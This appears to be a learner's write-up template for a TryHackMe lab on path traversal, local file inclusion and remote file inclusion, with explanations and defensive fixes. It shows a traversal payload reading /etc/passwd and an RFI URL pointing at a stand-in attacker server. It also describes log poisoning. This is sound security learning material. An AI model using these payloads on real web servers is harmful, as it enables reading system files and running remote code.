# File Inclusion (Path Traversal, LFI & RFI) — TryHackMe

**Date:** [YYYY-MM-DD]  
**Category:** Web, Server-Side  
**Skills used:** Path traversal, Local File Inclusion, Remote File Inclusion  

> **TL;DR:** Studied how applications that build file paths from user input can be abused —
> reading files outside the intended directory (**path traversal**), forcing the app to include
> local files like `/etc/passwd` or logs (**LFI**), and making it execute attacker-hosted code
> from a remote server (**RFI**).

## Overview
Many web applications load files based on user input — a language file, a template, a page
fragment (e.g. `?page=home`). If that input is used to build a file path **without proper
validation**, an attacker can change which file gets loaded. Depending on how the app then
*uses* that file, the impact ranges from reading sensitive files to full remote code execution.
The root cause across all three techniques is the same: **untrusted input reaching a file
operation.**

## Path Traversal (Directory Traversal)
The application uses input directly in a path and doesn't restrict where that path can point. By
inserting `../` sequences, an attacker climbs *up* out of the intended directory to reach files
elsewhere on the system:

```
?file=../../../../etc/passwd
```

Each `../` moves up one directory; enough of them reach the filesystem root, from where a known
path like `/etc/passwd` (Linux) or a Windows equivalent can be read. This is purely about
**reading files outside the intended folder**.

## Local File Inclusion (LFI)
LFI occurs when the application **includes and processes** a *local* file chosen by user input
(common in PHP with functions like `include()`). It goes a step beyond plain traversal because
the included file may be *executed*, not just read.

- **Reading sensitive files:** same traversal idea — pull config files, `/etc/passwd`, etc.
- **Bypassing naive filters:** apps that strip or expect certain strings can sometimes be
  defeated by encoding or path tricks (similar in spirit to the deny-list bypass in my SSRF
  writeup).
- **Escalating to code execution (log poisoning):** if an attacker can get attacker-controlled
  text into a file the server will *include and execute* (for example, injecting a payload into
  a log entry via a crafted request, then including that log file), LFI can be chained into
  **remote code execution**. The key idea is turning a "read any file" bug into "run my code."

## Remote File Inclusion (RFI)
RFI is the most severe: the application includes a file from a **remote URL** supplied by the
attacker. If the attacker hosts a malicious script on their own server and the target includes
it, that code runs on the target:

```
?file=http://attacker-server.thm/malicious.txt
```

RFI generally requires the server to be configured to allow fetching remote resources for
inclusion (in PHP, `allow_url_include`). It's rarer than LFI for that reason, but the impact —
direct code execution from an attacker-controlled source — is why it's treated as critical.

## Hands-On: TryHackMe Lab
*(Drop your actual lab work here — this is the section only you can write. For each lab:)*
- What parameter was includable, and how did you spot it (e.g. `?page=`, `?file=`)?
- The exact payload(s) you used, in a code block.
- What you managed to read or execute (e.g. `/etc/passwd`, a flag, a shell).
- Any filter you had to bypass, and how.

## The Fix (Defensive View)
The root cause is untrusted input reaching a file operation. Defenses, strongest first:
- **Avoid passing user input to file paths at all** — the real fix. Map user choices to a
  fixed **allow-list** of permitted files (e.g. `1 → home.php`) instead of using the input as a
  path.
- **Validate and canonicalize paths** — resolve the final path and confirm it stays within the
  intended directory, rejecting `../` sequences and encoded variants.
- **Disable remote inclusion** — turn off `allow_url_include` / `allow_url_fopen` so RFI is
  impossible.
- **Least privilege** — run the web server as a low-privilege user so even a successful read
  reaches fewer sensitive files.

## What I Learned
Learned how path traversal, LFI, and RFI relate as an escalating chain built on the *same* root
cause — untrusted input in a file operation — with impact rising from **reading files**
(traversal) to **executing local files** (LFI, e.g. via log poisoning) to **executing remote
code** (RFI). The most useful insight was that the fix is almost always to *stop using user
input as a path* and map to an allow-list instead — the same "allow-list beats deny-list"
lesson that came up in my SSRF writeup.
